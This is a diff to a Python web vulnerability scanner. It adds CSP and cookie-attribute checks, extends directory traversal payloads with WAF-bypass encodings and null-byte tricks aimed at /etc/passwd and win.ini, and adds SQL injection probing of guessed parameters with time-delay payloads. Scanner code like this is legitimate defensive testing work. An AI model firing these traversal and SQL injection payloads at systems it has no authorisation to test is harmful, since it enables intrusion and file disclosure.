@@ -1084,15 +1084,36 @@ def probe_security_headers(url: str, hdrs: dict, config=None) -> list:
             })
 
     csp = rh.get("content-security-policy", "")
-    if csp and ("unsafe-inline" in csp or "unsafe-eval" in csp):
-        findings.append({
-            "name": "Weak CSP (unsafe-inline / unsafe-eval)",
-            "type": "missing_security_header", "risk": "Medium", "url": url,
-            "description": "CSP contains 'unsafe-inline' or 'unsafe-eval' — XSS protection undermined.",
-            "solution": "Remove unsafe-inline/eval. Use nonces or hashes for inline scripts.",
-            "evidence": {"type": "weak_csp", "curl_poc": req_str,
-                         "actual_value": csp},
-        })
+    if csp:
+        if "unsafe-inline" in csp or "unsafe-eval" in csp:
+            findings.append({
+                "name": "Weak CSP (unsafe-inline / unsafe-eval)",
+                "type": "missing_security_header", "risk": "Medium", "url": url,
+                "description": "CSP contains 'unsafe-inline' or 'unsafe-eval' — XSS protection undermined.",
+                "solution": "Remove unsafe-inline/eval. Use nonces or hashes for inline scripts.",
+                "evidence": {"type": "weak_csp", "curl_poc": req_str,
+                             "actual_value": csp},
+            })
+        # Wildcard source in script-src or default-src allows any origin to inject scripts
+        if re.search(r"(?:script-src|default-src)[^;]*\s\*", csp):
+            findings.append({
+                "name": "Weak CSP (Wildcard Script Source)",
+                "type": "missing_security_header", "risk": "High", "url": url,
+                "description": "CSP script-src or default-src allows '*' — any external origin can load scripts.",
+                "solution": "Replace '*' with explicit trusted origins in script-src.",
+                "evidence": {"type": "weak_csp_wildcard", "curl_poc": req_str,
+                             "actual_value": csp},
+            })
+        # data: URI in script-src allows inline script execution via data URIs
+        if re.search(r"(?:script-src|default-src)[^;]*\bdata:", csp):
+            findings.append({
+                "name": "Weak CSP (data: URI in Script Source)",
+                "type": "missing_security_header", "risk": "Medium", "url": url,
+                "description": "CSP script-src or default-src allows 'data:' — permits script execution via data URIs.",
+                "solution": "Remove 'data:' from script-src. Use nonces or hashes instead.",
+                "evidence": {"type": "weak_csp_data_uri", "curl_poc": req_str,
+                             "actual_value": csp},
+            })
 
     return findings
 
@@ -1895,15 +1916,25 @@ def probe_directory_traversal(url: str, hdrs: dict, config=None) -> list:
     findings = []
 
     TRAVERSAL_SEQS = [
+        # Standard sequences
         "../etc/passwd",
         "../../etc/passwd",
         "../../../etc/passwd",
         "../../../../etc/passwd",
+        # URL-encoded slashes
         "..%2fetc%2fpasswd",
         "..%2F..%2Fetc%2Fpasswd",
         "%2e%2e%2fetc%2fpasswd",
+        # Double URL-encoded (WAF bypass)
+        "%252e%252e%252fetc%252fpasswd",
+        "%252e%252e/%252e%252e/etc/passwd",
+        # Null byte termination (bypass extension checks)
+        "../etc/passwd%00",
+        "../etc/passwd%00.jpg",
+        # Windows
         "..\\..\\windows\\win.ini",
         "..%5c..%5cwindows%5cwin.ini",
+        "%252e%252e%255cwindows%255cwin.ini",
     ]
 
     UNIX_SIG    = re.compile(r"root:[x*]?:\d+:\d+:")
@@ -2253,6 +2284,8 @@ def probe_cookie_attributes(url: str, hdrs: dict, config=None) -> list:
         has_httponly = "httponly" in cl
         has_secure   = bool(re.search(r"(;|\s)secure(\s*;|$)", cl))
         has_samesite = "samesite" in cl
+        samesite_m   = re.search(r"samesite\s*=\s*(\w+)", cl)
+        samesite_val = samesite_m.group(1) if samesite_m else ""
 
         checks = [
             (not has_httponly, "Session Cookie Missing HttpOnly Flag", "High",
@@ -2264,6 +2297,11 @@ def probe_cookie_attributes(url: str, hdrs: dict, config=None) -> list:
             (not has_samesite, "Session Cookie Missing SameSite",      "Medium",
              "No SameSite attribute — CSRF attacks possible.",
              "Add SameSite=Strict or Lax to all session cookies."),
+            (samesite_val == "none" and not has_secure,
+             "Session Cookie SameSite=None Without Secure Flag", "High",
+             "SameSite=None requires the Secure flag — without it, the cookie is sent "
+             "over plain HTTP and cross-site, defeating the SameSite protection entirely.",
+             "Always pair SameSite=None with the Secure flag."),
         ]
         for condition, name, risk, desc, sol in checks:
             if condition:
@@ -2496,7 +2534,13 @@ def probe_sql_injection(url: str, hdrs: dict, config=None) -> list:
 
     qs = parse_qs(parsed.query, keep_blank_values=True)
     if not qs:
-        return []
+        # No query params in URL — probe common parameter names with a neutral value.
+        # Many SQLi-vulnerable endpoints use params like id, q, user even when the
+        # base URL has none (e.g. /search, /product, /user).
+        qs = {p: ["1"] for p in [
+            "id", "q", "search", "user", "page", "item",
+            "product", "category", "name", "ref",
+        ]}
 
     def _make_url(param, value):
         new_qs = {**qs, param: [value]}
@@ -2563,6 +2607,11 @@ def probe_sql_injection(url: str, hdrs: dict, config=None) -> list:
                 continue  # confirmed on this param; skip time-based, move to next param
 
         # ── time-based ────────────────────────────────────────────────────────
+        t_base0  = time.monotonic()
+        _fetch(_make_url(param, original), hdrs)
+        baseline = time.monotonic() - t_base0
+        threshold = max(4.5, baseline + 4.0)  # at least 4s above server baseline
+
         TIME_PAYLOADS = [
             f"{original}; WAITFOR DELAY '0:0:5'--",  # MSSQL
             f"{original}' AND SLEEP(5)--",            # MySQL
@@ -2573,7 +2622,7 @@ def probe_sql_injection(url: str, hdrs: dict, config=None) -> list:
             t0 = time.monotonic()
             r  = _fetch(_make_url(param, payload), hdrs)
             elapsed = time.monotonic() - t0
-            if r and elapsed >= 4.5:
+            if r and elapsed >= threshold:
                 findings.append(_finding(
                     "time-based", _make_url(param, payload), param, payload,
                     f"Response delayed by {elapsed:.1f}s — blind time-based injection.",
